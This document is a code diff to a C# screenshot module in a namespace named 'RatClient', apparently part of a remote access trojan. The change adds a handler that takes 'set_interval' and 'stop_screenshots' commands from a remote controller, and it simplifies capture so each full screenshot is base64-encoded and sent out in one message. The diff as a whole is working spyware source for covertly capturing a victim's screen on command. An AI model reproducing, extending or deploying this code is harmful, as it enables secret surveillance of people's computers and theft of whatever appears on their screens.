@@ -1,11 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Windows.Forms;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace RatClient.Features
 {
@@ -13,7 +10,6 @@ namespace RatClient.Features
     {
         #region Variables
         private System.Timers.Timer screenshotTimer;
-        private Queue<string> screenshotChunks = new Queue<string>();
         private bool isSendingScreenshot = false;
         private int bufferSize;
         private Action<object> sendJson;
@@ -24,6 +20,21 @@ namespace RatClient.Features
         {
             this.bufferSize = bufferSize;
             this.sendJson = sendJson;
+            
+            Program.MessageReceived += HandleMessage;
+        }
+
+        private void HandleMessage(dynamic message)
+        {
+            switch (message["type"].ToString())
+            {
+                case "set_interval":
+                    SetIntervalAndStartSendingScreenshots((int)message["interval"]);
+                    break;
+                case "stop_screenshots":
+                    StopSendingScreenshots();
+                    break;
+            }
         }
 
         public void SetIntervalAndStartSendingScreenshots(int interval)
@@ -60,47 +71,12 @@ namespace RatClient.Features
                 return;
 
             isSendingScreenshot = true;
-            screenshotChunks.Clear();
 
             var screenshot = CaptureScreen();
             string base64Screenshot = Convert.ToBase64String(screenshot);
-            int chunkSize = CalculateMaxChunkSize();
+            sendJson(new { type = "screenshot", data = base64Screenshot });
 
-            for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
-            {
-                string chunk = base64Screenshot.Substring(i, Math.Min(chunkSize, base64Screenshot.Length - i));
-                screenshotChunks.Enqueue(chunk);
-            }
-            SendNextScreenshotChunk();
-        }
-
-        private int CalculateMaxChunkSize()
-        {
-            var sampleMessage = new { type = "screenshot_chunk", data = "", final = false };
-            string emptyJson = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(sampleMessage);
-            int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
-            int maxDataSize = bufferSize - jsonOverhead; // Buffer limit minus JSON overhead
-            return maxDataSize * 3 / 4; // Base64 encodes 3 bytes into 4 characters, hence multiply by 3/4
-        }
-
-        private void SendNextScreenshotChunk()
-        {
-            if (screenshotChunks.Count > 0)
-            {
-                string chunk = screenshotChunks.Dequeue();
-                bool isFinal = screenshotChunks.Count == 0;
-                var screenshotMessage = new { type = "screenshot_chunk", data = chunk, final = isFinal };
-                sendJson(screenshotMessage);
-
-                if (!isFinal)
-                {
-                    Task.Delay(10).ContinueWith(t => SendNextScreenshotChunk());
-                }
-                else
-                {
-                    isSendingScreenshot = false;
-                }
-            }
+            isSendingScreenshot = false;
         }
 
         private byte[] CaptureScreen()
